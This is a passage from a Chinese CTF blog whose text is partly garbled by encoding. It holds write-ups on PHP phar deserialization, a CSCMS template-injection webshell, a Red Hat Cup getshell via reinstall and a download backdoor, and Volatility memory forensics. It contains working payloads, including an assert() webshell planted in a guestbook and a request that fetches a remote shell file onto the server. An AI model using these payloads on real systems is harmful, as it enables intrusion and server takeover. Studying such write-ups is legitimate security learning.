$phar = new Phar(&quot;phar.phar&quot;);
$phar-&gt;startBuffering();
$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);
$phar-&gt;setStub($jpeg_header_size.&quot; __HALT_COMPILER(); ?&gt;&quot;);
$o = new TestObject();
$phar-&gt;setMetadata($o);
$phar-&gt;stopBuffering();</code></pre>
<h3 id="é™åˆ¶ä½¿ç”¨pharï¼š-å‡ºç°ä½ç½®"><a href="#é™åˆ¶ä½¿ç”¨pharï¼š-å‡ºç°ä½ç½®" class="headerlink" title="é™åˆ¶ä½¿ç”¨pharï¼š//å‡ºç°ä½ç½®"></a>é™åˆ¶ä½¿ç”¨pharï¼š//å‡ºç°ä½ç½®</h3><pre><code class="php">$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d458a3f373.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d458a3f373.html" class="post-title-link" itemprop="url">å¤ç°å¼ºç½‘æ¯çº¿ä¸‹èµ›CSCMS--SSITæ¨¡æ¿æ³¨å…¥</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2019-11-29 22:22:35" itemprop="dateCreated datePublished" datetime="2019-11-29T22:22:35+08:00">2019-11-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:16:51" itemprop="dateModified" datetime="2020-10-14T17:16:51+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>731</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>æ¼æ´å­˜åœ¨äºï¼š<code>\app\models\Csskins.php</code></p>
<ul>
<li><code>cscms_php</code>è¿™ä¸ªç±»æ–¹æ³•ä¸­å­˜åœ¨ä»£ç æ‰§è¡Œï¼Œï¼š</li>
</ul>
<pre><code class="php">    // phpæ ‡ç­¾å¤„ç†
    public function cscms_php($php,$content,$str) {
        $evalstr=&quot; return $content&quot;;
        $newsphp=eval($evalstr);
        $str=str_replace($php,$newsphp,$str);
        return $str;
    }</code></pre>
<ul>
<li>æˆ‘ä»¬è¿½è¸ª<code>cscms_php</code>åœ¨<code>template_parse</code>è¿™ä¸ªæ–¹æ³•ä¸­è¿›è¡Œäº†è°ƒç”¨ï¼Œä½†æ˜¯è¿™é‡Œè¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿™æ ·ç±»å‹çš„æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼š<code>{cscmsphp}phpinfo();{/cscmsphp}</code>è¿½è¸ª<code>$str</code>æ˜¯<code>template_parse</code>çš„ä¼ å…¥å‚æ•°ï¼Œæˆ‘ä»¬å†ç»§ç»­è¿½è¸ª<code>template_parse</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/1575037851193.png" alt="img"></p>
<ul>
<li>ç»è¿‡ä¸€æ®µæ—¶é—´çš„æŸ¥æ‰¾ï¼Œ<code>gbook_list</code>ç±»æ–¹æ³•è°ƒç”¨äº†<code>template_parse</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750381995978.png" alt="img"></p>
<ul>
<li>æˆ‘ä»¬è¿½è¸ª<code>$Mark_Text</code>å‘ç°å®ƒæ˜¯ç”±<code>$data_content</code>ç»è¿‡æ›¿æ¢å¾—åˆ°ã€‚é‚£ä¹ˆæˆ‘ä»¬ç»§ç»­è¿½è¸ª<code>$data_content</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750384557070.png" alt="img"></p>
<ul>
<li>ä»ä¸‹é¢ä»£ç æˆ‘ä»¬å¯ä»¥ç®€å•çŸ¥é“<code>$data_content</code>æ˜¯ç”±ä¸€ä¸ªæ•°ç»„å¾—åˆ°çš„ï¼Œè€Œè¿™ä¸ªæ•°ç»„æ˜¯é€šè¿‡æŸ¥è¯¢æ•°æ®åº“å¾—åˆ°çš„ã€‚è¿™é‡Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ€è·¯ï¼Œå°±æ˜¯é€šè¿‡ç•™è¨€æ¿æŠŠpayloadå†™å…¥æ•°æ®åº“ï¼Œè€Œå<code>gbook_list</code>ä¼šæŠŠpayloadæ‹¿å‡ºæ¥å»æ¸²æŸ“ï¼Œå› ä¸ºè¿™é‡Œæ— è®ºå†…å®¹æœ‰å“ªäº›æœ€ç»ˆåœ¨ä¼ åˆ°<code>cscms_php</code>è¿™ä¸ªç±»æ–¹æ³•æ—¶å€™éƒ½ä¼šè·å–åˆ°payloadã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750386263446.png" alt="img"></p>
<ul>
<li>ç•™è¨€å¤„æ’å…¥å¦‚ä¸‹payload</li>
</ul>
<pre><code>{cscmsphp}assert($_REQUEST[pwd]);{/cscmsphp}</code></pre><ul>
<li>è®¿é—®ï¼š</li>
</ul>
<pre><code>http://www.tp5.com/index.php/gbook/lists/1?pwd=phpinfo();</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750393335223.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d68bf56e4f.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d68bf56e4f.html" class="post-title-link" itemprop="url">çº¢å¸½æ¯çº¿ä¸‹éƒ¨åˆ† writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2019-11-22 22:28:47" itemprop="dateCreated datePublished" datetime="2019-11-22T22:28:47+08:00">2019-11-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:09:52" itemprop="dateModified" datetime="2020-10-14T17:09:52+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>804</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ç²¤æ¹¾æœŸè´§"><a href="#ç²¤æ¹¾æœŸè´§" class="headerlink" title="ç²¤æ¹¾æœŸè´§"></a>ç²¤æ¹¾æœŸè´§</h2><ul>
<li>é¦–å…ˆç›´å¥”<code>install.php</code>å‘ç°æºç ä¸­å¹¶æ²¡æœ‰åšå‡ºé‡è£…é™åˆ¶ï¼Œå¹¶ä¸”åœ¨<code>config.php</code>å¯ä»¥çŸ¥é“æ•°æ®åº“å’Œè´¦å·å¯†ç ç›´æ¥é‡è£…ç³»ç»Ÿæ‹¿ä¸‹åå°ã€‚</li>
<li>æ‹¿ä¸‹åå°å‘ç°ç³»ç»Ÿè®¾ç½®å¤„å¯ä»¥ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶ç±»å‹ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745165921699.png" alt="img"></p>
<ul>
<li>ä½†æ˜¯åŠ å…¥phpåç¼€ä½ å‘ç°ä¼šå°†phptæ›¿æ¢ä¸ºX,ä»æºç ä¸­å¯æœ‰å¾ˆç›´è§‚çœ‹åˆ°è¿™ç‚¹ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745169665422.png" alt="img"></p>
<ul>
<li>æ­¤æ—¶æ¯«æ— å¤´ç»ªï¼Œä»£ç å®¡è®¡æ•°é‡å¤ªå¤§ï¼Œæ‰€ä»¥é»‘ç›’æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°æ•°æ®å¤‡ä»½å¤„å¯ä»¥æ‰§è¡Œsqlè¯­å¥ã€‚æœ¬ä»¥ä¸ºå¯ä»¥ç›´æ¥å†™æ–‡ä»¶ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼Œè”æƒ³åˆ°ä¸Šé¢ä¸Šä¼ æ–‡ä»¶åç¼€æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨å¤‡ä»½æ–‡ä»¶é‡Œé¢ä¿®æ”¹åç¼€æ˜¯PHPï¼Œæœ€åç›´æ¥getshellå³å¯ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745175748287.png" alt="img"></p>
<ul>
<li>å¯¼å…¥å¤‡ä»½åå‘ç°è®¾ç½®ä¸­çš„ä¸Šä¼ åç¼€æœ‰php</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745180341751.png" alt="img"></p>
<ul>
<li>ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ç›´æ¥getshell</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745181028456.png" alt="img"></p>
<h2 id="ç²¤æ¹¾åŸºé‡‘"><a href="#ç²¤æ¹¾åŸºé‡‘" class="headerlink" title="ç²¤æ¹¾åŸºé‡‘"></a>ç²¤æ¹¾åŸºé‡‘</h2><p>/index.php/home/testå­˜åœ¨ä¸€å¤„åé—¨ç›´æ¥å¯getflag</p>
<pre><code>// /Home/Test/dlfile?file_url=http://xxxx/shell.txt&amp;save_to=/var/www/html/shell.php
///Home/Test/dlfile?file_url=file:///flag&amp;save_to=/var/www/html/1.txt
    // ä¸‹è½½å›¾ç‰‡
public function dlfile($file_url, $save_to)
{
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_POST, 0); 
        curl_setopt($ch,CURLOPT_URL,$file_url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        $file_content = curl_exec($ch);
        curl_close($ch);
        $downloaded_file = fopen($save_to, &#39;w&#39;);
        fwrite($downloaded_file, $file_content);
        fclose($downloaded_file);
}</code></pre>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7cc8e3b98.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d7cc8e3b98.html" class="post-title-link" itemprop="url">Volatilityå†…å­˜å–è¯å­¦ä¹ -å¤ç›˜çº¢å¸½æ¯Advertising for Marriage</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2019-11-14 22:17:16" itemprop="dateCreated datePublished" datetime="2019-11-14T22:17:16+08:00">2019-11-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:17:06" itemprop="dateModified" datetime="2020-10-14T17:17:06+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>458</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="è·å–é•œåƒä¿¡æ¯"><a href="#è·å–é•œåƒä¿¡æ¯" class="headerlink" title="è·å–é•œåƒä¿¡æ¯"></a>è·å–é•œåƒä¿¡æ¯</h1><pre><code class="shell">volatility -f &lt;file&gt; imageinfo</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738160914043.png" alt="img"></p>
<h1 id="è¯»å–è¿›ç¨‹"><a href="#è¯»å–è¿›ç¨‹" class="headerlink" title="è¯»å–è¿›ç¨‹"></a>è¯»å–è¿›ç¨‹</h1><pre><code class="shell">volatility -f &lt;file&gt; --profile=WinXPSP2x86 psscan</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738161931286.png" alt="img"></p>
<h1 id="è¯»å–æŒ‡å®šè¿›ç¨‹å†…å®¹"><a href="#è¯»å–æŒ‡å®šè¿›ç¨‹å†…å®¹" class="headerlink" title="è¯»å–æŒ‡å®šè¿›ç¨‹å†…å®¹"></a>è¯»å–æŒ‡å®šè¿›ç¨‹å†…å®¹</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 memdump -p 332 --dump-dir=./</code></pre>
<pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 notepad</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738164635401.png" alt="img"></p>
<ul>
<li><p>æå–å‡ºæ¥çš„æ–‡ä»¶ç”¨gimpæ‰“å¼€è°ƒæ•´å®½åº¦ç›´è‡³å‡ºç°å›¾åƒ</p>
</li>
<li><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738341787357.png" alt="img"></p>
</li>
<li><p>ç»¼åˆå¾—åˆ°æç¤º</p>
<pre><code>b1cxneedmoneyandgirlfirend</code></pre></li>
</ul>
<h1 id="æœç´¢å›¾ç‰‡"><a href="#æœç´¢å›¾ç‰‡" class="headerlink" title="æœç´¢å›¾ç‰‡"></a>æœç´¢å›¾ç‰‡</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86  filescan | grep -E &#39;jpg|png|jpeg|bmp|gif&#39;</code></pre>
<h1 id="æå–å›¾ç‰‡"><a href="#æå–å›¾ç‰‡" class="headerlink" title="æå–å›¾ç‰‡"></a>æå–å›¾ç‰‡</h1><pre><code>volatility -f 1.raw --profile=WinXPSP2x86 dumpfiles -Q 0x000000000249ae78  -n --dump-dir=./</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738343277555.png" alt="img"></p>
<h1 id="lsbè§£ç ã€base64ã€ç»´å‰å°¼äºšå¯†ç "><a href="#lsbè§£ç ã€base64ã€ç»´å‰å°¼äºšå¯†ç " class="headerlink" title="lsbè§£ç ã€base64ã€ç»´å‰å°¼äºšå¯†ç "></a>lsbè§£ç ã€base64ã€ç»´å‰å°¼äºšå¯†ç </h1><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780599940.jpg" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780779999.jpg" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="XiaoLeung"
      src="/header.jpg">
  <p class="site-author-name" itemprop="name">XiaoLeung</p>
  <div class="site-description" itemprop="description">éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">64</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.redmango.top/" title="https://www.redmango.top/" rel="noopener" target="_blank">HhhM</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://l1near.top/" title="https://l1near.top/" rel="noopener" target="_blank">L1nearã®space</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.mrskye.cn/" title="https://www.mrskye.cn/" rel="noopener" target="_blank">SkYe's Blog</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.kawhi.xyz" title="https://www.kawhi.xyz" rel="noopener" target="_blank">kawhi</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn" rel="noopener" target="_blank">ç²¤ICPå¤‡18132442å·-1 </a>
      <img src="/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" rel="noopener" target="_blank">ç²¤å…¬ç½‘å®‰å¤‡ 44011202000643å· </a>
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">XiaoLeung</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">231k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">3:30</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        


  <div style="display: none;">
    <script src="//s95.cnzz.com/z_stat.php?id=true&web_id=true"></script>
  </div>






      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
